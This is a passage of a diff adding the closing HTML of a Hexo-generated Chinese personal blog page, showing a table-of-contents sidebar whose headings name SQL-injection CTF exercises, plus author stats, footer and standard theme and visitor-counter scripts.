nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E4%B8%BE%E4%BE%8B"><span class="nav-number">3.9.5.</span> <span class="nav-text">过滤绕过举例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Week4-3-%E5%AE%9E%E9%AA%8C-SQL-%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%88%98"><span class="nav-number">4.</span> <span class="nav-text">*[Week4.3]实验:SQL 注入实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="nav-number">4.1.</span> <span class="nav-text">[SWPUCTF 2024 秋季新生赛]ez_sql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA"><span class="nav-number">4.1.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6-%E8%A7%A3%E5%86%B3%E5%89%8D%E4%B8%80%E9%A2%98%E7%9A%84-more-than-%E9%97%AE%E9%A2%98"><span class="nav-number">4.2.</span> <span class="nav-text">Less-6(解决前一题的 more than 问题)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL1"><span class="nav-number">4.3.</span> <span class="nav-text">[极客大挑战 2019]BabySQL1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%81%9A%E9%A2%98%E5%90%AF%E7%A4%BA-2"><span class="nav-number">4.3.1.</span> <span class="nav-text">做题启示</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">legend1440</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Sun Jan 18 2026 08:00:00 GMT+0800 (GMT+08:00) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">legend1440</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
